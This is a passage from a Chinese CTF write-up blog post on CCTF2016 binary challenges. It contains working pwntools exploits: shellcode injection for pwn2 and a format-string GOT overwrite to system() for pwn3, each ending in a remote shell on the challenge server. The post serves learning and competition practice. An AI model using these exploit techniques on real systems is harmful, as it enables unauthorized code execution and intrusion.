+<p>正好5字节。首先是用mov吧函数的返回地址更改到main函数中gets那一句<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>080484BA                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">28h</span>], <span class="built_in">eax</span></div><div class="line"><span class="symbol">.text:</span>080484BE                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">28h</span>]</div><div class="line"><span class="symbol">.text:</span>080484C2                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">0FFAh</span></div><div class="line"><span class="symbol">.text:</span>080484C7                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>], <span class="built_in">eax</span></div><div class="line"><span class="symbol">.text:</span>080484CB                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>]</div><div class="line"><span class="symbol">.text:</span>080484CF                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; s</span></div><div class="line"><span class="symbol">.text:</span>080484D2                 <span class="keyword">call</span>    _gets					&lt;&lt;&lt;&lt;&lt;&lt;&lt;--------这里</div><div class="line"><span class="symbol">.text:</span>080484D7                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">8</span>], <span class="number">5</span> <span class="comment">; n</span></div><div class="line"><span class="symbol">.text:</span>080484DF                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>]</div><div class="line"><span class="symbol">.text:</span>080484E3                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">4</span>], <span class="built_in">eax</span>    <span class="comment">; src</span></div><div class="line"><span class="symbol">.text:</span>080484E7                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">28h</span>]</div><div class="line"><span class="symbol">.text:</span>080484EB                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; dest</span></div></pre></td></tr></table></figure></p>
+<p>因为用ret返回的关系。整个栈是平衡的。所以最后还能够再次跳转的“新大陆”。又因为在ret的时候栈里的布局是这样的<br/><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">00</span>:<span class="number">0000</span>| <span class="function"><span class="title">esp</span> 0xff997c4c --&gt;</span> <span class="number">0</span>x80484f9 (&lt;main+<span class="number">124</span>&gt;:	leave)</div><div class="line"><span class="number">01</span>:<span class="number">0004</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c50</span> --&gt;</span> <span class="number">0</span><span class="function"><span class="title">x31337000</span> --&gt;</span> <span class="number">0</span>xd22404c6</div><div class="line"><span class="number">02</span>:<span class="number">0008</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c54</span> --&gt;</span> <span class="number">0</span><span class="function"><span class="title">x31337ffa</span> --&gt;</span> <span class="number">0</span>xd22404c6</div><div class="line"><span class="number">03</span>:<span class="number">0012</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c58</span> --&gt;</span> <span class="number">0</span>x5</div><div class="line"><span class="number">04</span>:<span class="number">0016</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c5c</span> --&gt;</span> <span class="number">0</span>x22 (b<span class="string">'"'</span>)</div><div class="line"><span class="number">05</span>:<span class="number">0020</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c60</span> --&gt;</span> <span class="number">0</span>x0</div><div class="line"><span class="number">06</span>:<span class="number">0024</span>|     <span class="number">0</span><span class="function"><span class="title">xff997c64</span> --&gt;</span> <span class="number">0</span>x0</div></pre></td></tr></table></figure></p>
+<p>返回之后的参数正好是mmap的首地址。这样的长度就够写shellcode啦。</p>
+<p>最后的脚本，如下<br/><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pwn</div><div class="line"></div><div class="line"><span class="comment">#target = pwn.process('/tmp/pwn2')</span></div><div class="line">target = pwn.remote(<span class="string">"120.27.130.77"</span>,<span class="number">9000</span>)</div><div class="line">shellcode = <span class="string">"\xeb\x08\x61\x61\x61\x61\x41\x41\x41\x41\x68\x2f\x73\x68\xff\x68\x2f\x62\x69\x6e\x8d\x1c"</span> \</div><div class="line">            <span class="string">"\x24\x31\xc0\x88\x43\x07\x50\x53\x89\xe1\x8d\x51\x04\x83\xc0\x0b\xcd\x80\x31\xc0\x40\x31"</span> \</div><div class="line">            <span class="string">"\xdb\xcd\x80"</span></div><div class="line"></div><div class="line"><span class="comment">#pwn.gdb.attach(target)</span></div><div class="line"><span class="comment">#raw_input('debuger')</span></div><div class="line"></div><div class="line">target.sendline(<span class="string">'\xc6\x04\x24\xd2\xc3'</span>)</div><div class="line">target.sendline(shellcode + <span class="string">'a'</span> * (<span class="number">4090</span> - len(shellcode)) + <span class="string">'\xeb\x08aaa'</span>)</div><div class="line">target.interactive()</div></pre></td></tr></table></figure></p>
+<p>完结撒shellcode</p>
+<h2 id="pwn3"><a class="headerlink" href="#pwn3" title="pwn3"></a>pwn3</h2><p>拿到后看了会，程序一开始会做个验证，把每个输入字符+1后和”sysbdmin”比较<br/>进入后，有3个功能<br/>1.putfile       &lt;-malloc一段内存存放文件名和内容<br/>2.getfile       &lt;-输入文件名，输出内容(存在格式化字符串漏洞，顺便会把内容放在栈上)<br/>3.show_dir      &lt;-把所有文件名存放到数组，输出数组，且不分割<br/><img alt="" src="./CCTF2016_writeup  LoRexxar's Blog/pwn31.png"/>格式化字符串</p>
+<p>那么接下来的思路就很自然了<br/>1.通过getfile的格式化字符串拿到libc的相对位置<br/>2.因为内容可控制而且还在栈上，就可以构造指向got@plt的指针，然后通过%n(改写指针指向的值为已输出的字符个数)就可以改got表了</p>
+<p>但有几个问题<br/>1.虽然可以通过%n改写内存，但我们要写入的是地址值，也就是一般要输出很多字符<br/>2.改写成哪个地址<br/>3.改写哪个函数</p>
+<p>第一个问题，因为写入的是4字节，所以我们可以写4次，低位写到高位，每次改1字节，这样最多输出字符也就是256*4了<br/>比如 0x12345678 -&gt; 0xdeadbeef 先写入0xef 然后往上移一字节写0xbe 这样就有了0x0000beef …<br/>第二个问题，既然要改，当然改成system，前面可以拿到libc的相对地址，虽然不知道libc版本，不过可以跑啊<br/>第三个问题，我们选的函数应该是要能控制参数的，而且在getfile中不会涉及到的函数，一开始找找不到，然后才发现show_dir的puts就可以。。。因为show_dir的puts的参数是文件名，而且puts在getfile中只有输入flag才会触发，所以并不用担心。于是每次输入”/bin/sh”的一个字节就能凑出来参数</p>
+<p>ps:就在我的test输出0的时候，我拿到了shell<br/><img alt="" src="./CCTF2016_writeup  LoRexxar's Blog/pwn32.png"/>shell<br/>payload:<br/><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line"></div><div class="line"><span class="comment">#R = process('./pwn3')</span></div><div class="line">R=remote(<span class="string">'120.27.155.82'</span>,<span class="number">9000</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setvalue</span><span class="params">(addr,value)</span>:</span></div><div class="line">	a=[<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'/'</span>,<span class="string">'s'</span>]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">		R.write(<span class="string">'put\n'</span>)</div><div class="line">		R.recvuntil(<span class="string">':'</span>)</div><div class="line">		R.write(a[<span class="number">3</span>-i]+<span class="string">'\n'</span>)</div><div class="line">		R.recvuntil(<span class="string">':'</span>)</div><div class="line">		R.write(<span class="string">'%'</span>+<span class="string">'%03d'</span>%((value&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>)<span class="number">-2</span>)+<span class="string">'x'</span>+<span class="string">'  '</span>+<span class="string">'%10$n'</span>+p32(addr+i)+<span class="string">'\n'</span>)</div><div class="line">		R.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">		R.write(<span class="string">'get\n'</span>)</div><div class="line">		R.recvuntil(<span class="string">':'</span>)</div><div class="line">		R.write(a[<span class="number">3</span>-i]+<span class="string">'\n'</span>)</div><div class="line">		R.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">		i+=<span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</div><div class="line">	R.recvuntil(<span class="string">':'</span>)</div><div class="line">	R.write(<span class="string">'rxraclhm\n'</span>)</div><div class="line">	R.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">	R.write(<span class="string">'put'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'h'</span>*<span class="number">1</span>+<span class="string">'\n'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'%x%x%x%x'</span>+<span class="string">'\n'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'get'</span>+<span class="string">'\n'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'h'</span>+<span class="string">'\n'</span>)</div><div class="line">	s=R.recv()</div><div class="line">	libc=int(s[<span class="number">8</span>:<span class="number">16</span>],<span class="number">16</span>)</div><div class="line">	sys=libc<span class="number">-0xb7e8683b</span>+<span class="number">0xb7e56190</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'#####sys:%x'</span>%(sys+i)</div><div class="line">        <span class="keyword">print</span> <span class="string">'###test %d'</span>%i</div><div class="line">	R.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">	R.write(<span class="string">'dir'</span>)</div><div class="line">	R.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">	setvalue(<span class="number">0x804A028</span>,sys)</div><div class="line">	R.write(<span class="string">'put'</span>)</div><div class="line">	R.write(<span class="string">'/b\n'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'a\n'</span>)</div><div class="line">	R.recv()</div><div class="line">	R.write(<span class="string">'dir'</span>)</div><div class="line">	R.interactive()</div><div class="line">	R.close()</div></pre></td></tr></table></figure></p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></p>
+<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
+<p><span>发布时间:</span>2016-04-25, 12:20:27</p>
+<p><span>最后更新:</span>2016-04-26, 14:06:52</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/04/25/cctf2016/" title="CCTF2016_writeup">http://lorexxar.cn/2016/04/25/cctf2016/</a>
+<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/04/25/cctf2016/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<div class="article-nav-title" id="article-nav-newer">
+<a href="/2016/05/02/ggctf2016/">
+                    google_ctf2016_writeup
+                </a>
+</div>
+<div class="article-nav-title" id="article-nav-older">
+<a href="/2016/04/20/gif-ccsp/">
+                    gif bypass CSP?
+                </a>
+</div>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pentest"><span class="toc-number">1.</span> <span class="toc-text">pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDS-Chicken"><span class="toc-number">1.1.</span> <span class="toc-text">IDS-Chicken</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#萝莉俱乐部系列"><span class="toc-number">1.2.</span> <span class="toc-text">萝莉俱乐部系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#萝莉2"><span class="toc-number">1.2.1.</span> <span class="toc-text">萝莉2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#萝莉1"><span class="toc-number">1.2.2.</span> <span class="toc-text">萝莉1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#萝莉3"><span class="toc-number">1.2.3.</span> <span class="toc-text">萝莉3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#萝莉4"><span class="toc-number">1.2.4.</span> <span class="toc-text">萝莉4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#签个到"><span class="toc-number">2.1.</span> <span class="toc-text">签个到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Best-Easy-Misc"><span class="toc-number">2.2.</span> <span class="toc-text">Best_Easy_Misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#True-or-False"><span class="toc-number">2.3.</span> <span class="toc-text">True or False?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-Game"><span class="toc-number">2.4.</span> <span class="toc-text">EZ Game</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Base-安码"><span class="toc-number">3.</span> <span class="toc-text">Base{安码}</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC1"><span class="toc-number">3.1.</span> <span class="toc-text">MISC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC2"><span class="toc-number">3.2.</span> <span class="toc-text">MISC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re1"><span class="toc-number">3.3.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re2"><span class="toc-number">3.4.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re3"><span class="toc-number">3.5.</span> <span class="toc-text">re3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BIN"><span class="toc-number">4.</span> <span class="toc-text">BIN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2048？4096？"><span class="toc-number">4.1.</span> <span class="toc-text">2048？4096？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Difffffffffuse"><span class="toc-number">4.2.</span> <span class="toc-text">Difffffffffuse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">4.3.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">4.4.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">4.5.</span> <span class="toc-text">pwn3</span></a></li></ol></li></ol>
+</div>
+<style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
+<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>
+
+<script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"CCTF2016_writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+
+<section class="youyan" id="comments">
+<script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+<script> loadComment(); </script>
+<div id="uyan_frame"></div>
+</section>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/05/02/ggctf2016/" title="上一篇: google_ctf2016_writeup">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/04/20/gif-ccsp/" title="下一篇: gif bypass CSP?">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li 